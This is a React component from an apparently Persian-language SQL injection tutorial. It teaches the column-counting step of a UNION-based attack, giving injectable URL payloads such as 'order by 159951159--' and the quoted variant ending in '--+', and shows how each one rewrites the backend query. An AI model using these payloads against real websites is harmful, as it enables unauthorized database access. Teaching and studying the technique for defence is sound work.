/** @format */

import { Bold, Code, Divider, Step } from '@/app/Components/common'
import { Card } from '@/app/Components/common'

export default function SecondStep({ url }: { url: string }) {
  return (
    <Card simple={false} title='پیدا کردن تعداد ستون های موجود در کوئری'>
      <Step type='GOAL'>پیدا کردن تعداد ستون های موجود در کوئری</Step>
      <Step type='METHOD'>
        <p>در این مرحله اولین دستوری که تست میکنیم به صورت زیر می باشد:</p>
        <Code>{url} order by 159951159--</Code>
      </Step>
      <Step type='DESCRIPTION'>
        <p>
          در این مرحله سعی می کنیم با استفاده از دستور order by متوجه شویم که چه تعداد ستون در کوئری وجود دارد. این
          موضوع از این نظر اهمیت دارد که در مراحل بعدی برای تزریق دستور UNION SELECT حتما باید مقدار دقیق تعداد ستون ها
          را داشته باشیم.
        </p>
        <ul className='m-2'>
          <li>
            <Bold>۱-</Bold> معنی
            <Bold>order by 159951159</Bold>
            این است که کوئری را بر اساس
            <Bold>159951159 مین ستون</Bold>
            مرتب کنیم.
          </li>
          <li>
            <Bold>۲-</Bold> مقدار <Bold>159951159</Bold>
            یک مقدار دلخواه است که باید عدد
            <Bold>بزرگی</Bold>
            باشد. پیشنهاد می شود از اعداد <Bold>بیشتر از چهار رقم</Bold> استفاده شود.
          </li>
          <li>
            <Bold>۳-</Bold> مقدار <Bold>--</Bold>در انتهای دستور برای <Bold>کامنت کردن</Bold> ادامه ی کوئری اصلی می
            باشد. با این کار اطمینان حاصل می کنیم که دستوراتی که در ادامه کوئری اصلی وجود دارد باعث ایجاد مشکل یا تداخل
            با مقداری که تزریق کرده ایم نمی شود. بخش تحلیل کوئری شامل توضیحات فنی این بخش می باشد.
          </li>
        </ul>
      </Step>

      <Step type='RESULT'>
        <p>
          دیتابیس سعی می کند خروجی را بر اساس 159951159 ستون مرتب سازی کند و عملا ستون 159951159 ام وجود ندارد، چون
          تعداد ستون های جداول دیتابیس بصورت حدودی تا 4096 می باشد. در دنیای واقعی احتمال وجود جدولی با تعداد ستون بیش
          از ۱۰۰ تا بسیار محدود می باشد. به هر حال عددی که ما انتخاب می کنیم مطمئنا سقف مجاز تعداد ستون های موجود در
          جدوال دیتابیس را رد می کند که منجر به بروز خطا در دیتابیس می شود.
        </p>
        <p>
          انجام این کار می تواند نتایجی مانند
          <Bold>نمایش خطای دیتابیسی،</Bold>
          <Bold>عدم لود شدن دیتا</Bold>و یا بصورت کلی
          <Bold>تغییر در نتیجه ی کوئری و به طبع آن تغییر در نمایش اطلاعات سایت</Bold>
          داشته باشد.
        </p>
        <Bold>
          توجه کنید که برخی اوقات تزریق این دستور باعث ایجاد هیچ یک از موارد ذکر شده نمی گردد، که در صورت بروز این اتفاق
          از دستور زیر استفاده می کنیم:
        </Bold>
        <Code>{`${url}'`} order by 159951159--+</Code>
        <p>
          یعنی اضافه کردن کوتیشن بعد از پارامتر و همچنین اضافه کردن علامت <Bold>+</Bold> در انتهای کوئری. چرایی این
          موضوع و توضیح کوئری در بخش تحلیل کوئری آورده شده است.
        </p>
        <p>
          بعد از اطمینان از تغییر رفتار کوئری، باید با تغییر مقدار 159951159 سعی در پیدا کردن تعداد ستون های موجود در
          کوئری کنیم. برای این کار به نمونه تزریق های زیر دقت کنید:
        </p>
        <Code>1) {url} order by 10--</Code>
        <Code>2) {url} order by 9--</Code>
        <Code>3) {url} order by 8--</Code>
        <Code>4) {url} order by 7--</Code>
        <Code>5) {url} order by 6--</Code>
        <Bold>
          <span className='text-red-600 text-lg'>
            تعداد ستون های کوئری برابر است با بزرگترین عدد بعد از order by که اطلاعات سایت را بدون تغییر یا بروز خطا
            نمایش دهد .
          </span>
        </Bold>
        <p>
          توجه داشته باشید که برای پیدا کردن بزرگترین عددی که اطلاعات را بدون خطا یا تغییر نمایش دهد باید اعداد مختلف را
          تست کنیم. در مثال بالا اعداد ۱۰ و ۹ و ۸ و ۷ و ۶ بصورت مثال آورده شده است.
        </p>
        <p>با فرض اینکه جواب عدد ۷ باشد سناریو را پیش می بریم.</p>
      </Step>

      <Step type='QUERY'>
        برای آدرس
        <Code>{url}</Code>
        کوئری ای مشابه
        <Code>SELECT id, name, category_id from posts WHERE id = 10 another sql statements...</Code>
        در سمت بک اند اجرا می شود که منظور از <Bold>another sql statements</Bold> دستورات شرطی، مرتب سازی، گروه بندی
        و... ای است که ممکن است در ادامه ی کوئری وجود داشته باشد. با تزریق
        <Code>{'order by 159951159--'}</Code>
        به دیتابیس، کوئری از حالت قبل به حالت زیر تغییر می کند.
        <Code>1) After Injection: ORDER BY 159951159-- another sql statements...</Code>
        <Code>2) Result: SELECT id, name, category_id from posts WHERE id = 10 ORDER BY 159951159</Code>
        <p>در مرحله قبل با فرض اینکه عدد ۷ تعداد ستون های موجود در کوئری باشد، کوئری نهایی این بخش بصورت </p>
        <Code>SELECT id, name, category_id from posts WHERE id = 10 ORDER BY 7</Code>
        با تزریق
        <Code>{url} order by 7--</Code>
        یا
        <Code>{`${url}' order by 7--+`}</Code>
        می باشد.
        <Divider />
        <div className='flex gap-2 text-lg font-bold mb-5'>
          <span>تفاوت</span>
          <code className='px-2 bg-red-200 rounded-sm' dir='ltr'>
            {'id=10 order by 159951159--'}
          </code>
          <span>با</span>
          <code className='px-2 bg-red-200 rounded-sm' dir='ltr'>
            {"id=10' order by 159951159--+"}
          </code>
        </div>
        <p>برای درک بهتر این موضوع، کوئری های زیر را در نظر بگیرید:</p>
        <Code>{'1) $sql = SELECT id, name, category_id from posts WHERE id = 10;'}</Code>
        <Code>{"2) $sql = SELECT id, name, category_id from posts WHERE id = '10';"}</Code>
        <p>
          در کوئری اول مقدار id بدون کوتیشن و برابر 10 می باشد. اکنون هر دو حالت <code>order by</code> را برای حالت ۱
          بررسی میکنیم:
        </p>
        <Code>
          {
            '(id=10 order by 159951159--) ==> $sql = SELECT id, name, category_id from posts WHERE id = 10 order by 159951159--;'
          }
        </Code>
        <Code>
          {
            "(id=10' order by 159951159--+) ==> $sql = SELECT id, name, category_id from posts WHERE id = 10' order by 159951159-- ;"
          }
        </Code>
        <p>
          در حالت اول حمله به درستی انجام می شود. زیرا مقدار تزریق شده به جای id، علاوه بر مقدار دهی درست id، دستور
          <code>order by</code> را نیز به انتهای کوئری اضافه می کند.
        </p>
        <p>
          در حالت دوم به دلیل قرارگیری کوتیشن بعد از id، با خطای سینتکسی مواجه شده و عملا مرحله ی <code>order by</code>{' '}
          وارد کوئری نمی شود.
        </p>
        <p>
          اما در کوئری شماره ۲ داستان متفاوت است. در این بخش هر دو حالت <code>order by</code> را برای کوئری ۲ بررسی می
          کنیم:
        </p>
        <Code>
          {
            "(id=10 order by 159951159--) ==> $sql = SELECT id, name, category_id from posts WHERE id = '10 order by 159951159--';"
          }
        </Code>
        <Code>
          {
            "(id=10' order by 159951159--+) ==> $sql = 'SELECT id, name, category_id from posts WHERE id = '10' order by 159951159-- ';"
          }
        </Code>
        <p>
          در حالت اول با خطای سینتکسی مواجه می شویم، زیرا عبارت <code>--</code> باعث کامنت شدن کوتیشن می شود.
        </p>
        <p>
          در حالت دوم اما id به درستی مقدار دهی می شود و مقدار <code>order by</code> نیز پس از آن قرار می گیرد و سپس
          کاراکتر کوتیشن نهایی نیز توسط علامت <code>--</code> کامنت می شود.
        </p>
        
      </Step>
    </Card>
  )
}
